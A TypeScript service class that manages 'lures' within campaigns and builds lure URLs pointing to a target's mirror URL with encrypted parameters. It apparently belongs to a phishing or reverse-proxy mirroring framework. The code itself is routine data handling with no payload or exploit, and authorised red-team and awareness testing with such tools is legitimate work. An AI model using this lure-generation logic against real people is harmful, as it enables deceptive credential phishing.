import { DIContainer, arrayIncludes, encrypt, randomName } from '@famir/common'
import {
  CAMPAIGN_REPOSITORY,
  CampaignRepository,
  DatabaseError,
  DatabaseErrorCode,
  LURE_REPOSITORY,
  LureModel,
  LureRepository,
  REDIRECTOR_REPOSITORY,
  RedirectorParams,
  RedirectorRepository,
  TARGET_REPOSITORY,
  TargetRepository,
} from '@famir/database'
import { ReplServerError } from '@famir/repl-server'

/**
 * DI token for the lure service.
 *
 * @category Lure
 */
export const LURE_SERVICE = Symbol('LureService')

/**
 * Represents the lure service.
 *
 * @category Lure
 */
export class LureService {
  /**
   * Registers the service as a singleton in the DI container.
   *
   * @param container - The DI container to register in.
   */
  static register(container: DIContainer) {
    container.registerSingleton<LureService>(
      LURE_SERVICE,
      (c) =>
        new LureService(
          c.resolve<CampaignRepository>(CAMPAIGN_REPOSITORY),
          c.resolve<TargetRepository>(TARGET_REPOSITORY),
          c.resolve<RedirectorRepository>(REDIRECTOR_REPOSITORY),
          c.resolve<LureRepository>(LURE_REPOSITORY)
        )
    )
  }

  /**
   * Creates a new service instance.
   *
   * @param campaignRepository - The campaign repository instance.
   * @param targetRepository - The target repository instance.
   * @param redirectorRepository - The redirector repository instance.
   * @param lureRepository - The lure repository instance.
   */
  constructor(
    protected readonly campaignRepository: CampaignRepository,
    protected readonly targetRepository: TargetRepository,
    protected readonly redirectorRepository: RedirectorRepository,
    protected readonly lureRepository: LureRepository
  ) {}

  /**
   * Creates a new lure.
   *
   * @param data - The data object.
   * @returns The created lure model.
   */
  async create(data: {
    campaignId: string
    lureId: string
    path: string
    redirectorId: string
    lockSecret: string
  }): Promise<LureModel> {
    try {
      await this.lureRepository.create(
        data.campaignId,
        data.lureId,
        data.path,
        data.redirectorId,
        data.lockSecret
      )
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'CONFLICT', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code,
          })
        }
      }

      throw error
    }

    const lure = await this.lureRepository.read(data.campaignId, data.lureId)

    if (!lure) {
      throw new ReplServerError(`Lure not found`, {
        code: 'NOT_FOUND',
      })
    }

    return lure
  }

  /**
   * Reads the lure by its ID.
   *
   * @param data - The data object.
   * @returns The lure model.
   * @throws {@link ReplServerError} If the lure is not found.
   */
  async read(data: { campaignId: string; lureId: string }): Promise<LureModel> {
    const lure = await this.lureRepository.read(data.campaignId, data.lureId)

    if (!lure) {
      throw new ReplServerError(`Lure not found`, {
        code: 'NOT_FOUND',
      })
    }

    return lure
  }

  /**
   * Enables the lure, making it available for request routing.
   *
   * @param data - The data object.
   */
  async enable(data: { campaignId: string; lureId: string; lockSecret: string }): Promise<void> {
    try {
      await this.lureRepository.enable(data.campaignId, data.lureId, data.lockSecret)
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code,
          })
        }
      }

      throw error
    }
  }

  /**
   * Disables the lure, stopping request routing.
   *
   * @param data - The data object.
   */
  async disable(data: { campaignId: string; lureId: string; lockSecret: string }): Promise<void> {
    try {
      await this.lureRepository.disable(data.campaignId, data.lureId, data.lockSecret)
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code,
          })
        }
      }

      throw error
    }
  }

  /**
   * Deletes the lure by its ID.
   *
   * @param data - The data object.
   */
  async delete(data: {
    campaignId: string
    lureId: string
    redirectorId: string
    lockSecret: string
  }): Promise<void> {
    try {
      await this.lureRepository.delete(
        data.campaignId,
        data.lureId,
        data.redirectorId,
        data.lockSecret
      )
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code,
          })
        }
      }

      throw error
    }
  }

  /**
   * Lists all lures for the campaign.
   *
   * @param data - The data object.
   * @returns The array of lure models.
   */
  async list(data: { campaignId: string }): Promise<LureModel[]> {
    const lures = await this.lureRepository.list(data.campaignId)

    if (!lures) {
      throw new ReplServerError(`Campaign not found`, {
        code: 'NOT_FOUND',
      })
    }

    return lures
  }

  /**
   * Makes the lure URL with optional params.
   *
   * @param data - The data object.
   * @returns The lure URL string.
   * @throws {@link ReplServerError} If the campaign is not found.
   * @throws {@link ReplServerError} If the lure is not found.
   * @throws {@link ReplServerError} If the target is not found.
   * @throws {@link ReplServerError} If the redirector is not found.
   */
  async makeUrl(data: {
    campaignId: string
    lureId: string
    targetId: string
    params: RedirectorParams
  }): Promise<string> {
    const lure = await this.lureRepository.read(data.campaignId, data.lureId)

    if (!lure) {
      throw new ReplServerError(`Lure not found`, {
        code: 'NOT_FOUND',
      })
    }

    const campaign = await this.campaignRepository.readFull(data.campaignId)

    if (!campaign) {
      throw new ReplServerError(`Campaign not found`, {
        code: 'NOT_FOUND',
      })
    }

    const target = await this.targetRepository.readFull(data.campaignId, data.targetId)

    if (!target) {
      throw new ReplServerError(`Target not found`, {
        code: 'NOT_FOUND',
      })
    }

    const redirector = await this.redirectorRepository.readFull(data.campaignId, lure.redirectorId)

    if (!redirector) {
      throw new ReplServerError(`Redirector not found`, {
        code: 'NOT_FOUND',
      })
    }

    if (!redirector.checkParams(data.params)) {
      throw new ReplServerError(`Redirector wrong params`, {
        code: 'BAD_REQUEST',
      })
    }

    if (redirector.isLoose) {
      return [target.mirrorUrl, lure.path].join('')
    } else {
      return [
        target.mirrorUrl,
        lure.path,
        '?',
        randomName(),
        '=',
        encrypt(JSON.stringify(data.params), campaign.cryptSecret),
      ].join('')
    }
  }
}
